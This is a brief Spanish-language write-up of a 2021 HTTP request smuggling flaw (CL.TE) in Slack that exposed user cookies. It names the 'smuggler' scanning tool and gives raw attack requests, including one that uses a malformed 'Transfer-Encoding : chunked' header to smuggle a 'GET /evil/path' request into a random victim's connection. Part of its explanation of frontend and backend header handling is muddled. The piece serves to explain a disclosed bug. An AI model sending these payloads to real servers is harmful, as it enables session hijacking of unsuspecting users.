este es un bug reportado en 2021 en slack, que permitía obtener las cookies de un usuario. paso el comando smuggler -u slackb.com,
de la herramienta opensouce ["smuggler"](https://github.com/defparam/smuggler).
la vulnerabilidad era un CL.TE, es decir que el fontend priorizaba el content length, al enviar transfer encoding, sin embargo, debería priorizar el transfer encoding y para que el content length no reconozca el transfer encoding, ya que probablemente este configurado para usar content length, gracias al espacio no reconocia el transfer encoding.
tenía que poner un espacio entre el transfer-encoding y chunked
Transfer-Encoding : chunked
y así el backend lo removía y lo reconocía como transfer-encoding. 
```
POST / HTTP/1.1
Host: slackb.com
Cookie: user=Bob
Transfer-Encoding : chunked
Content-Length: 12

0
Key=value
```
eso era enviado por el frontend como una sola petición, pero el backend, priorizando el transfer encoding, enviaría key=value.
entonces envío un ataque así:
```
POST / HTTP/1.1
Host: slackb.com
Cookie: user=Bob
Transfer-Encoding : chunked
Content-Length: 30

0
GET /evil/path HTTP/1.1
X:
```
donde la siguiente request se veía incluída, causando un "open redirect".
la víctima era un usuario random, y no había manera de elegir a quien era